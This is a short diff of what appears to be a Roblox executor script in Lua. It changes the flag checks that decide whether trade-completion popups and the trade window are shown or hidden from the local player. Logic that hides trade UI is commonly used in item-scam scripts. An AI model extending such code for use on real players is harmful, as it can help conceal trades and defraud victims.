@@ -112,7 +112,7 @@ Popup:GetPropertyChangedSignal("Visible"):Connect(function()
         end
         local text = table.concat(words, " "):lower()
         if text:find("trade") and (text:find("complete") or text:find("successful")) then
-            if getgenv().aol and not getgenv().here then
+            if getgenv().aol then
                 Popup.Visible = true
             else
                 getgenv().aol = true
@@ -133,7 +133,7 @@ local TradeFrame = LocalPlayer.PlayerGui.MainGui.OtherFrames.Trade.Frame
 local TradeGui = LocalPlayer.PlayerGui.MainGui.OtherFrames.Trade
 TradeGui:GetPropertyChangedSignal("Visible"):Connect(function()
     if TradeGui.Visible then
-        if getgenv().aol and not getgenv().here then
+        if getgenv().aol then
             TradeFrame.Visible = true
         else
             TradeFrame.Visible = false
